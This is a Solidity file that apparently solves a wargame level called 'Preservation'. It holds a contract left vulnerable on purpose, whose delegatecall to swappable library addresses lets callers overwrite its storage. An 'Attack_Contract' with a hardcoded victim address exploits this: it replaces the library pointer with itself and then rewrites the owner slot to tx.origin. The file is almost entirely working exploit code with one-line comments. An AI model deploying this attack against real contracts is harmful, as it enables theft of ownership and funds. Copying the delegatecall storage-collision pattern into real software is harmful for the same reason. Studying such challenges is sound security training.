
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract Attack_Contract{
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    address victim = 0xd4d9a2736f21FB8b959e1139bA76862ED7e84837;
    function attack() public {
        Preservation(victim).setFirstTime(uint256(address(this)));  // we first change the address of lib1 in our victim contract
        Preservation(victim).setFirstTime(1);  //then call this method again with any random parameter it will call setTime below
    }

    function setTime(uint256 _owner) public {
        owner = tx.origin;  //we now change the owner to our EAO and completed the level
    }
}
